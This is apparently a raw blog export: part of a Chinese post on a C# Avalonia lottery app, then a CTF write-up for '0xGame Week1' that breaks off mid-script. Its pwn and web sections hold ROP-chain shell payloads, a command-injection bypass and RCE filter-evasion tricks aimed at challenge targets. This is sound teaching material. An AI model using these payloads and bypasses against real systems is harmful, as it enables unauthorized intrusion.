最后还要及时删除参与者的数据，避免重复抽奖\n\n如下：\n\n```c#\npublic List<DrawResult> DrawWinners()\n{\n    var results = new List<DrawResult>();\n    var availableParticipants = _participants.ToList();\n\n    // 如果没有参与者，返回空结果\n    if (availableParticipants.Count == 0)\n    {\n        return results;\n    }\n\n    foreach (var prize in _prizes)\n    {\n        // 计算实际抽奖数量：取奖项数量和剩余参与者数量的较小值\n        int actualQuantity = Math.Min(prize.Quantity, availableParticipants.Count);\n        \n        for (int i = 0; i < actualQuantity && availableParticipants.Count > 0; i++)\n        {\n            var randomIndex = _random.Next(availableParticipants.Count);\n            var winner = availableParticipants[randomIndex];\n            \n            results.Add(new DrawResult\n            {\n                WinnerName = winner.Name,\n                Prize = prize,\n                DrawTime = DateTime.Now\n            });\n\n            availableParticipants.RemoveAt(randomIndex);\n        }\n    }\n\n    _results.AddRange(results);\n    return results;\n}\n```\n\n以上就是抽奖的实现逻辑，此外，值得一提的是`readonly`关键字的使用，\n\n1.\n\n```c#\nprivate readonly List<Participant> _participants = new();\n```\n\n这是private封装（内部只读存储），`readonly`使它不能被重新赋值（例如不能再 `_participants = new List<...>()`），但**可以修改集合内部的元素**（如 `_participants.Add(...)`），这就可以很好地支持了操作部分参与者的需求。\n\n2.\n\n```c#\npublic ReadOnlyCollection<Participant> Participants => _participants.AsReadOnly();\n```\n\n这也是封装（readonly只读保护），给外部提供的`readonly`只读访问接口，支持获取参与者信息，也保护了数据不被外部删改。\n\n## View层\n\nView视图的UI设计(`.axaml`)和事件绑定(`.axaml.cs`)相关的数据交互我都放在了这一层处理。\n\n关于UI设计等我过几天再补吧，太累了，先不写了（\n\n\n\n## 从`.csproj`到`.exe`\n\n在这一步我也走了很多的弯路，最后也是在拷打`llm`各AI大模型下完成了这最后一步。~~总而言之，能跑就是win!~~\n\n\n\n## Keep Ongoing\n\n👆🏼\n","slug":"Csharp流水账-Avalonia","published":1,"updated":"2025-09-27T12:49:47.726Z","comments":1,"layout":"post","photos":[],"_id":"cmg29rsvk0000fst8arwe71kl","content":"<h1 id=\"流水账-Avalonia\"><a href=\"#流水账-Avalonia\" class=\"headerlink\" title=\"流水账-Avalonia\"></a>流水账-Avalonia</h1><blockquote>\n<p>近几天尝试用<code>Avalonia</code>搞了一个<code>Draw</code>(<del>也算是借鉴🦊佬的学习路线了</del>),但是非常悲伤的是没有设计出MVVM的架构，<del>仅是MV架构就要我半条命</del>，ViewModel层拼尽全力不知道该填些什么…小记一下我的折腾。</p>\n</blockquote>\n<h2 id=\"Model层\"><a href=\"#Model层\" class=\"headerlink\" title=\"Model层\"></a>Model层</h2><p>没有高端的玩意儿，总而言之就是💩山，只有最最最基础的<code>class</code>，没有<code>record</code>、<code>dictionary</code>那些🥹，用不惯喵。我甚至把所有类都塞到了一个<code>.cs</code>文件里,不过能跑就⭐（×），唉唉，不管了。    </p>\n<p>我设计了四个类，<code>Prize</code>、<code>Participant</code>、<code>DrawResult</code>、<code>DrawManager</code>，分别用来放奖项信息、参与者信息、抽奖结果和抽奖发起者的行为。</p>\n<p>前三个类存放相关信息，当然也要支持修改，支持读取，所以均使用<code>&#123;get;set;&#125;</code>访问控制器。</p>\n<p>至于抽奖发起者，一个最重要的行为就是要组织开奖，也就是获取<code>DrawWinners()</code>的行为，而获奖者一般也不止一个，所以我选用了<code>List</code>,也就封装出了<code>public List&lt;DrawResult&gt; DrawWinners()</code>这个函数。接下来细想一下，这个函数需要哪些实现逻辑呢？</p>\n<ul>\n<li>首先需要获取参与者信息</li>\n<li>当然也需要获取奖项设立的情况</li>\n<li>抽奖的随机性也是必须的</li>\n<li>最后还要及时删除参与者的数据，避免重复抽奖</li>\n</ul>\n<p>如下：</p>\n<figure class=\"highlight c#\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> List&lt;DrawResult&gt; <span class=\"title\">DrawWinners</span>()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> results = <span class=\"keyword\">new</span> List&lt;DrawResult&gt;();</span><br><span class=\"line\">    <span class=\"keyword\">var</span> availableParticipants = _participants.ToList();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 如果没有参与者，返回空结果</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (availableParticipants.Count == <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> results;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> (<span class=\"keyword\">var</span> prize <span class=\"keyword\">in</span> _prizes)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 计算实际抽奖数量：取奖项数量和剩余参与者数量的较小值</span></span><br><span class=\"line\">        <span class=\"built_in\">int</span> actualQuantity = Math.Min(prize.Quantity, availableParticipants.Count);</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"built_in\">int</span> i = <span class=\"number\">0</span>; i &lt; actualQuantity &amp;&amp; availableParticipants.Count &gt; <span class=\"number\">0</span>; i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> randomIndex = _random.Next(availableParticipants.Count);</span><br><span class=\"line\">            <span class=\"keyword\">var</span> winner = availableParticipants[randomIndex];</span><br><span class=\"line\">            </span><br><span class=\"line\">            results.Add(<span class=\"keyword\">new</span> DrawResult</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                WinnerName = winner.Name,</span><br><span class=\"line\">                Prize = prize,</span><br><span class=\"line\">                DrawTime = DateTime.Now</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">            availableParticipants.RemoveAt(randomIndex);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    _results.AddRange(results);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> results;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>以上就是抽奖的实现逻辑，此外，值得一提的是<code>readonly</code>关键字的使用，</p>\n<ol>\n<li></li>\n</ol>\n<figure class=\"highlight c#\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">readonly</span> List&lt;Participant&gt; _participants = <span class=\"keyword\">new</span>();</span><br></pre></td></tr></table></figure>\n\n<p>这是private封装（内部只读存储），<code>readonly</code>使它不能被重新赋值（例如不能再 <code>_participants = new List&lt;...&gt;()</code>），但<strong>可以修改集合内部的元素</strong>（如 <code>_participants.Add(...)</code>），这就可以很好地支持了操作部分参与者的需求。</p>\n<ol start=\"2\">\n<li></li>\n</ol>\n<figure class=\"highlight c#\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> ReadOnlyCollection&lt;Participant&gt; Participants =&gt; _participants.AsReadOnly();</span><br></pre></td></tr></table></figure>\n\n<p>这也是封装（readonly只读保护），给外部提供的<code>readonly</code>只读访问接口，支持获取参与者信息，也保护了数据不被外部删改。</p>\n<h2 id=\"View层\"><a href=\"#View层\" class=\"headerlink\" title=\"View层\"></a>View层</h2><p>View视图的UI设计(<code>.axaml</code>)和事件绑定(<code>.axaml.cs</code>)相关的数据交互我都放在了这一层处理。</p>\n<p>关于UI设计等我过几天再补吧，太累了，先不写了（</p>\n<h2 id=\"从-csproj到-exe\"><a href=\"#从-csproj到-exe\" class=\"headerlink\" title=\"从.csproj到.exe\"></a>从<code>.csproj</code>到<code>.exe</code></h2><p>在这一步我也走了很多的弯路，最后也是在拷打<code>llm</code>各AI大模型下完成了这最后一步。<del>总而言之，能跑就是win!</del></p>\n<h2 id=\"Keep-Ongoing\"><a href=\"#Keep-Ongoing\" class=\"headerlink\" title=\"Keep Ongoing\"></a>Keep Ongoing</h2><p>👆🏼</p>\n","excerpt":"","more":"<h1 id=\"流水账-Avalonia\"><a href=\"#流水账-Avalonia\" class=\"headerlink\" title=\"流水账-Avalonia\"></a>流水账-Avalonia</h1><blockquote>\n<p>近几天尝试用<code>Avalonia</code>搞了一个<code>Draw</code>(<del>也算是借鉴🦊佬的学习路线了</del>),但是非常悲伤的是没有设计出MVVM的架构，<del>仅是MV架构就要我半条命</del>，ViewModel层拼尽全力不知道该填些什么…小记一下我的折腾。</p>\n</blockquote>\n<h2 id=\"Model层\"><a href=\"#Model层\" class=\"headerlink\" title=\"Model层\"></a>Model层</h2><p>没有高端的玩意儿，总而言之就是💩山，只有最最最基础的<code>class</code>，没有<code>record</code>、<code>dictionary</code>那些🥹，用不惯喵。我甚至把所有类都塞到了一个<code>.cs</code>文件里,不过能跑就⭐（×），唉唉，不管了。    </p>\n<p>我设计了四个类，<code>Prize</code>、<code>Participant</code>、<code>DrawResult</code>、<code>DrawManager</code>，分别用来放奖项信息、参与者信息、抽奖结果和抽奖发起者的行为。</p>\n<p>前三个类存放相关信息，当然也要支持修改，支持读取，所以均使用<code>&#123;get;set;&#125;</code>访问控制器。</p>\n<p>至于抽奖发起者，一个最重要的行为就是要组织开奖，也就是获取<code>DrawWinners()</code>的行为，而获奖者一般也不止一个，所以我选用了<code>List</code>,也就封装出了<code>public List&lt;DrawResult&gt; DrawWinners()</code>这个函数。接下来细想一下，这个函数需要哪些实现逻辑呢？</p>\n<ul>\n<li>首先需要获取参与者信息</li>\n<li>当然也需要获取奖项设立的情况</li>\n<li>抽奖的随机性也是必须的</li>\n<li>最后还要及时删除参与者的数据，避免重复抽奖</li>\n</ul>\n<p>如下：</p>\n<figure class=\"highlight c#\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> List&lt;DrawResult&gt; <span class=\"title\">DrawWinners</span>()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> results = <span class=\"keyword\">new</span> List&lt;DrawResult&gt;();</span><br><span class=\"line\">    <span class=\"keyword\">var</span> availableParticipants = _participants.ToList();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 如果没有参与者，返回空结果</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (availableParticipants.Count == <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> results;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> (<span class=\"keyword\">var</span> prize <span class=\"keyword\">in</span> _prizes)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 计算实际抽奖数量：取奖项数量和剩余参与者数量的较小值</span></span><br><span class=\"line\">        <span class=\"built_in\">int</span> actualQuantity = Math.Min(prize.Quantity, availableParticipants.Count);</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"built_in\">int</span> i = <span class=\"number\">0</span>; i &lt; actualQuantity &amp;&amp; availableParticipants.Count &gt; <span class=\"number\">0</span>; i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> randomIndex = _random.Next(availableParticipants.Count);</span><br><span class=\"line\">            <span class=\"keyword\">var</span> winner = availableParticipants[randomIndex];</span><br><span class=\"line\">            </span><br><span class=\"line\">            results.Add(<span class=\"keyword\">new</span> DrawResult</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                WinnerName = winner.Name,</span><br><span class=\"line\">                Prize = prize,</span><br><span class=\"line\">                DrawTime = DateTime.Now</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">            availableParticipants.RemoveAt(randomIndex);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    _results.AddRange(results);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> results;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>以上就是抽奖的实现逻辑，此外，值得一提的是<code>readonly</code>关键字的使用，</p>\n<ol>\n<li></li>\n</ol>\n<figure class=\"highlight c#\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">readonly</span> List&lt;Participant&gt; _participants = <span class=\"keyword\">new</span>();</span><br></pre></td></tr></table></figure>\n\n<p>这是private封装（内部只读存储），<code>readonly</code>使它不能被重新赋值（例如不能再 <code>_participants = new List&lt;...&gt;()</code>），但<strong>可以修改集合内部的元素</strong>（如 <code>_participants.Add(...)</code>），这就可以很好地支持了操作部分参与者的需求。</p>\n<ol start=\"2\">\n<li></li>\n</ol>\n<figure class=\"highlight c#\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> ReadOnlyCollection&lt;Participant&gt; Participants =&gt; _participants.AsReadOnly();</span><br></pre></td></tr></table></figure>\n\n<p>这也是封装（readonly只读保护），给外部提供的<code>readonly</code>只读访问接口，支持获取参与者信息，也保护了数据不被外部删改。</p>\n<h2 id=\"View层\"><a href=\"#View层\" class=\"headerlink\" title=\"View层\"></a>View层</h2><p>View视图的UI设计(<code>.axaml</code>)和事件绑定(<code>.axaml.cs</code>)相关的数据交互我都放在了这一层处理。</p>\n<p>关于UI设计等我过几天再补吧，太累了，先不写了（</p>\n<h2 id=\"从-csproj到-exe\"><a href=\"#从-csproj到-exe\" class=\"headerlink\" title=\"从.csproj到.exe\"></a>从<code>.csproj</code>到<code>.exe</code></h2><p>在这一步我也走了很多的弯路，最后也是在拷打<code>llm</code>各AI大模型下完成了这最后一步。<del>总而言之，能跑就是win!</del></p>\n<h2 id=\"Keep-Ongoing\"><a href=\"#Keep-Ongoing\" class=\"headerlink\" title=\"Keep Ongoing\"></a>Keep Ongoing</h2><p>👆🏼</p>\n"},{"title":"0xGame Week1 WP","date":"2025-10-09T16:00:00.000Z","top_img":"/images/background/东方/08.jpg","cover":"/images/background/东方/07.jpg","_content":"\n# Pwn\n\n## 数学题😭\n\n```python\nfrom pwn import *\ncontext.log_level='debug'\nio=remote(\"nc1.ctfplus.cn\",23143)\nio.recvuntil(b\"Kore wa shiren da!(n\")\n for i in range(1000):\n\t t=io.recvuntil(b\"?\")[:-3]\n\t if b\"x\" in t:\n\t\tt=t.decode()\n\t\tt =t.replace(\"x\",'*'\n\t\tt=t.encode()\n\t num=eval(t)\n\t io.sendline(str(num).encode())\n\t io.recvline()\n\t io.recvline()\nio.interactive()\n```\n\n## nc\n\n`nc 域名/IP 端口号`\n\n## 命令执行\n\n`ca\\t flag `这样就可以啦。\n\n## 栈溢出\n\n`buf`到`rbp`的偏移+8就是填充的垃圾数据的长度，后面再加上目标函数的返回地址就行了。\n\n## ROP1\n\n找到`rdi`，一参寄存器的地址\n\n```python\nROPgadget --binary pwn --only \"pop|ret\" | grep \"rdi\"\n```\n\n找到想要rdi存放的参数`sh`\n\n```python\nROPgadget --binary pwn --string \"sh\"\n```\n\n然后就同上一题栈溢出，构造ROP链。\n\n```python\npayload=0x28*b'a'+p64(0x000000000040117e)+p64(0x000000000040201e)+p64(0x401195)\n```\n\n就能得到flag了。\n\n完整代码：\n\n```python\nfrom pwn import *\nio=process('./pwn')\ngdb.attach(io)      // gdb调试\npayload=0x28*b'a'+p64(0x000000000040117e)+p64(0x000000000040201e)+p64(0x401195)\nio.send(payload)\nio.interactive()\n```\n\n## ROP2\n\n除了`sh`,`cat`,还有`$0`也可以获得shell，\n\n```pyhton\ngdb ./pwn\n```\n\n可以在gdb中找到`$0`字符串\n\n```python\nsearch \"$0\"\n```\n\n找到`$0`的地址后就对应替换`rdi`参数的地址。ROP链同上题。\n\n# Osint\n\n图一谷歌识图，注意山名是中文，大室山\n\n图二拍摄时的经纬度其实在照片的详细信息里已经记录了，右键属性详细信息，往下滑就能找到GPS，里面就记录了经纬度，然后进行换算，不进位，就得到了`32.1191`经度和`118.9265` 纬度。\n\n# Web\n\n## Lemon\n\n`web`是真不会，我只会开发者工具查看源码,然后就只会解签到。真的看不懂`php`😭。（骗你的，就算懂了也不会改写`http`请求。）\n\n## Http请求\n\nurl后面加`/?hello=web`这就是get传递。\n\n然后用burp抓包，对应修改请求参数，就能得到flag了。\n\n`0XGame{Congratuation_You_Are_Http_God!!!}`\n\n## rce1\n\n![hackbar](/images/wp/hackbar.png)\n\n右键检查>>找到hackbar，按上面的设置参数，注意`rce1[]=1`这样才表示rce1是数组.数组的md5相等。一些指令参数被过滤的话可以试试其他的，如`readfile`,`print`等，然后可以用引号把一些指令隔开，分开来写就不会被过滤了。如`'fl'.'a''g'`,引号之间用.拼接。对于要执行的命令需要用反引号，如``print(`tac f???`)``,反引号表示运行里面的命令。\n\n# Misc\n\n## 签到\n\n扫码关注喵~\n\n## Sign-In\n\n`==`结尾判断是base64加密，通过在线工具解密之后发现并不是`0xGame{}`,原来是还经过了字符移位，通过已知flag格式计算出偏移量，得到flag。\n\n## 公众号\n\n`.docx`文件其实就是一个`.zip`压缩包，所以更改一下后缀名，然后将`.zip`文件解压，接下来就可以去一个个文件(如`.xml`文件)里找`flag`了。\n\n## shell\n\n按照yolo师傅给的提示操作就行\n\n## shell_plus\n\n进入`welcome`用户后先`cat hash_value`找到哈希值，然后在`fikes`文件夹里用`find . -maxdepth 1 -type f -exec sha256sum {} \\; | grep \"c59aec252d136cd2da2c5af7b17aed68f661a0114e8fc38b6e2a3d4e993e38fa\"`这一行命令就可以找到那个加密的flag文件，最后用揭秘脚本解密。\n\n## LSB隐写\n\nStegSolve工具打开图片，R,G,B通道设为最低位0，就能看到flag了`0xGame{W1_Need_t0_t@k3_a_break}`。\n\n## 磁盘镜像\n\n在`bash`里用`TestDisk`分析磁盘\n\n```bash\ntestdisk do_not_enter.dd\n```\n\n在分区表中发现了一个名为 **`[Do_not_enter]`** 的分区.\n\n挂载分区,\n\n```bash\nsudo mount -o loop,offset=44040192 do_not_enter.dd /mnt/secret\n```\n\n查看分区内容,\n\n```bash\nls -la /mnt/secret\n\n# 如果有文件夹，深入查看\nfind /mnt/secret -type f -name \"*flag*\" 2>/dev/null\nfind /mnt/secret -type f 2>/dev/null\n```\n\n但不幸的是分区之中没有,不如直接用`strings`把全部字符串找出来吧，`strings`命令好用！\n\n```bash\nsudo strings /mnt/secret/syslog\nsudo strings /mnt/secret/auth.log\n```\n\n然后就找到了flag:`0xGame{WoW_y0u_fouNd_1t?_114514}`\n\n# Reverse\n\n## SignIn\n\n`shift`+F12  就可以看到所有字符串啦，包括flag🥰。\n\n## SignIn2\n\nROT加密：凯撒密码，移位操作进行字符加密。  0移位16得到@。从而得到`0xGame{}`形式的flag。\n\n## ZZZ\n\n```python\n# 导入z3库\nfrom z3 import *\n\nx1 = BitVec('x1', 32)\nx2 = BitVec('x2', 32)\nx3 = BitVec('x3', 32)\nx4 = BitVec('x4', 32)\nsolver = Solver()\nsolver.add(3 * x2 + 5 * x1 + 7 * x4 + 2 * x3 == -1445932505)\nsolver.add(8 * x2 + 4 * x3 + 2 * x1 + x4 == -672666814)\nsolver.add(7 * x2 + 3 * x1 + 5 * x4 + 4 * x3 == 958464147)\nsolver.add(((x1 ^ x2) << 6) + (LShR(x3, 6) ^ 0x4514) == 123074281)\n# 循环寻找所有可能的\nwhile solver.check() == sat:\n    model = solver.model()\n    v1 = model[x1].as_long()\n    v2 = model[x2].as_long()\n    v3 = model[x3].as_long()\n    v4 = model[x4].as_long()\n\n    print(f\"x1 = {hex(v1)} ({v1})\")\n    print(f\"x2 = {hex(v2)} ({v2})\")\n    print(f\"x3 = {hex(v3)} ({v3})\")\n    print(f\"x4 = {hex(v4)} ({v4})\")\n    final_flag = f\"0xGame{{{v1:08x}{v2:08x}{v3:08x}{v4:08x}}}\"\n    print(f\"Flag: {final_flag}\")\n    solver.add(Or(x1 != v1, x2 != v2, x3 != v3, x4 != v4))\n```\n\n此题有多解，注意正确flag的哈希值。\n\n# Crypto\n\n## 维吉尼亚加密\n\n全AI,维吉尼亚加密advanced我解出了多种可能，试了一下`0xGame{excellent}`这个是对的，就解出来了。\n\n```python\nfrom string import digits, ascii_letters, punctuation, ascii_lowercase\nfrom itertools import product\n\nkey = \"QAQ(@.@)\"\nalphabet = digits + ascii_letters + punctuation\nciphertext = \"0l0CSoYM<c;amo_P_\"\n\nprint(f\"密文: {ciphertext}\")\nprint(f\"Key: {key}\")\nprint(f\"Alphabet长度: {len(alphabet)}\")\nprint(\"=\"*70)\n\n# 验证加密函数\ndef vigenere_encrypt(plaintext, key):\n    ciphertext = \"\"\n    key_index = 0\n    for i in plaintext:\n        bias = alphabet.index(key[key_index])\n        char_index = alphabet.index(i)\n        new_index = ((char_index + bias) * char_index) % len(alphabet)\n        ciphertext += alphabet[new_index]\n        key_index = (key_index + 1) % len(key)\n    return ciphertext\n\n# 找出每个位置的所有可能解\ndef find_all_solutions_per_position(ciphertext, key):\n    all_solutions = []\n    \n    for pos, cipher_char in enumerate(ciphertext):\n        key_index = pos % len(key)\n        bias = alphabet.index(key[key_index])\n        cipher_index = alphabet.index(cipher_char)\n        \n        solutions = []\n        for char_index in range(len(alphabet)):\n            if ((char_index + bias) * char_index) % len(alphabet) == cipher_index:\n                solutions.append(alphabet[char_index])\n        \n        all_solutions.append(solutions)\n    \n    return all_solutions\n\nall_solutions = find_all_solutions_per_position(ciphertext, key)\n\n# 显示每个位置的可能解\nprint(\"\\n每个位置的所有可能解:\")\nfor i, (cipher_char, solutions) in enumerate(zip(ciphertext, all_solutions)):\n    key_char = key[i % len(key)]\n    print(f\"位置{i:2d} | 密文:'{cipher_char}' key:'{key_char}' | 解:{solutions} (共{len(solutions)}个)\")\n\nprint(\"\\n\" + \"=\"*70)\n\n# 尝试搜索所有符合条件的flag\nprint(\"搜索符合 0xGame{小写字母} 格式的所有可能flag:\\n\")\n\ntarget_prefix = \"0xGame{\"\ntarget_suffix = \"}\"\n\n# 检查前缀和后缀是否可行\nprefix_valid = all(target_prefix[i] in all_solutions[i] for i in range(len(target_prefix)))\nsuffix_valid = target_suffix in all_solutions[-1]\n\nif not prefix_valid:\n    print(\"❌ 无法构造 '0xGame{' 前缀\")\n    for i in range(len(target_prefix)):\n        if target_prefix[i] not in all_solutions[i]:\n            print(f\"   位置{i}: 需要'{target_prefix[i]}', 但只有 {all_solutions[i]}\")\nelif not suffix_valid:\n    print(f\"❌ 无法构造 '}}' 后缀，位置{len(ciphertext)-1}只有: {all_solutions[-1]}\")\nelse:\n    print(\"✓ 前缀和后缀都可行\\n\")\n    \n    # 中间部分的索引\n    middle_start = len(target_prefix)\n    middle_end = len(ciphertext) - 1\n    \n    # 获取中间每个位置的小写字母选项\n    middle_options = []\n    for i in range(middle_start, middle_end):\n        lowercase_opts = [c for c in all_solutions[i] if c in ascii_lowercase]\n        middle_options.append(lowercase_opts)\n        print(f\"位置{i} 的小写字母选项: {lowercase_opts}\")\n    \n    # 检查是否所有中间位置都有小写字母选项\n    if all(len(opts) > 0 for opts in middle_options):\n        print(f\"\\n所有中间位置都有小写字母选项\")\n        print(f\"总共有 {sum(len(opts) for opts in middle_options)} 个可能的组合\")\n        \n        # 如果组合数不太多，枚举所有可能\n        total_combinations = 1\n        for opts in middle_options:\n            total_combinations *= len(opts)\n        \n        print(f\"可能的flag数量: {total_combinations}\")\n        \n        if total_combinations <= 1000:\n            print(\"\\n枚举所有可能的flag:\\n\")\n            valid_flags = []\n            \n            for combo in product(*middle_options):\n                middle = \"\".join(combo)\n                flag = target_prefix + middle + target_suffix\n                \n                # 验证\n                encrypted = vigenere_encrypt(flag, key)\n                if encrypted == ciphertext:\n                    valid_flags.append(flag)\n                    print(f\"✓ 找到有效flag: {flag}\")\n            \n            if not valid_flags:\n                print(\"❌ 没有找到完全匹配的flag\")\n            else:\n                print(f\"\\n找到 {len(valid_flags)} 个有效flag\")\n        else:\n            print(f\"\\n组合数太多({total_combinations})，显示第一个可能的flag:\")\n            middle = \"\".join(opts[0] for opts in middle_options)\n            flag = target_prefix + middle + target_suffix\n            encrypted = vigenere_encrypt(flag, key)\n            print(f\"Flag: {flag}\")\n            print(f\"验证: {encrypted == ciphertext}\")\n    else:\n        print(\"\\n❌ 某些中间位置没有小写字母选项\")\n```\n\n## 笙莲\n\n题目将一个 100 字节的 flag（原始 flag 内容 + 随机填充）分成了四个 25 字节的部分，并对每个部分使用了不同的加密方法。我们的任务是分别逆向这些加密过程，然后将四部分拼接回来，最后得到原始的 flag。\n\n给定的密文：\n\n```python\nc0_b64 = b'MHhHYW1le7u2063AtLW9MHhHYW1lMjAyNQ=='\nc1_hex = 'a3accfd6d4dac4e3d2d1beadd1a7bbe143727970746fb5c4bb'\nc2_awaqaq = 'wqwwwqqaawwwaaqawqwawwwwaaawwwawaqqwwwqaqwwqwaaqwaqqaaawqqqaqaqwaaawwwqaqaaaaqawaqqqwwqqwaqwqwwwawawqqwwqqawqwaqwwawwqwaqqaqwaw'\nc3_int = 5787980659359196741038715872684190805073807486263453249083702093905274294594502252203577660251756609738877887210677202141957646934092054500618364441642896304387589669635034683021946777034215355675802286923927161922717560413551789421376288823912349463080999424773600185557948875343480056576969695671340947861706467351885610345887785319870159654836532664189086047061137903149197973327299859185905186913896041309284477616128\n```\n\nPart1. Base64解密\n\n```python\nimport base64\n\nflag0 = base64.b64decode(c0_b64)\n```\n\nPart2.十六进制转字节\n\n```python\nflag1 = bytes.fromhex(c1_hex)\n```\n\nPart3. 替换加密, 'a' 代表 0，'w' 代表 1，'q' 代表 2\n\n```python\ndef reverse_awaqaq(s: str) -> bytes:\n    mapper = {'a': 0, 'w': 1, 'q': 2}\n    num = 0\n    power = 1\n    for char in s:\n        num += mapper[char] * power\n        power *= 3\n    # 原始脚本中 int.from_bytes 默认使用大端序 (big-endian)\n    # 长度为 25 字节\n    return num.to_bytes(25, 'big')\n\nflag2 = reverse_awaqaq(c2_awaqaq)\n```\n\nPart4. 7次方并用小端序表示的数，开7次方根\n\n```python\ndef integer_nth_root(n, r):\n    \"\"\"计算 n 的 r 次整数根\"\"\"\n    if n < 0:\n        return None\n    if n == 0:\n        return 0\n    low, high = 1, n\n    root = None\n    while low <= high:\n        mid = (low + high) // 2\n        if mid == 0:  # 避免 mid 为 0\n            low = 1\n            continue\n        try:\n            val = mid**r\n        except OverflowError:\n            val = float('inf')\n        \n        if val == n:\n            return mid\n        elif val < n:\n            low = mid + 1\n            root = mid\n        else:\n            high = mid - 1\n    return root\n\nroot = integer_nth_root(c3_int, 7)\n# 题目指明了使用小端序 (little-endian)\nflag3 = root.to_bytes(25, 'little')\n```\n\n最后拼接4个部分的flag，然后使用`gb2312`编码解码得到flag。\n\n## 2FA\n\n这道题的收获就是安装了一个好用的身份验证APP，`microsoft authenticator`，扫码验证登录了就行了。\n\n## 芸翎\n\n```python\nimport socket\nimport re\nimport hashlib\nimport string\nfrom itertools import product\nfrom Crypto.Util.number import long_to_bytes\nimport time\n\n# --- 配置 ---\nHOST = 'nc1.ctfplus.cn'\nPORT = 12494\n\n# --- PoW 解决函数 ---\ndef solve_pow(suffix: str, target_hash: str) -> str:\n    \"\"\"\n    通过暴力破解来解决 SHA-256 工作量证明挑战。\n    \"\"\"\n    print(f\"[*] 目标: sha256(XXXX + {suffix}) == {target_hash}\")\n    print(\"[*] 开始暴力破解 PoW...\")\n    start_time = time.time()\n    \n    # 字符集：大小写字母 + 数字\n    charset = string.ascii_letters + 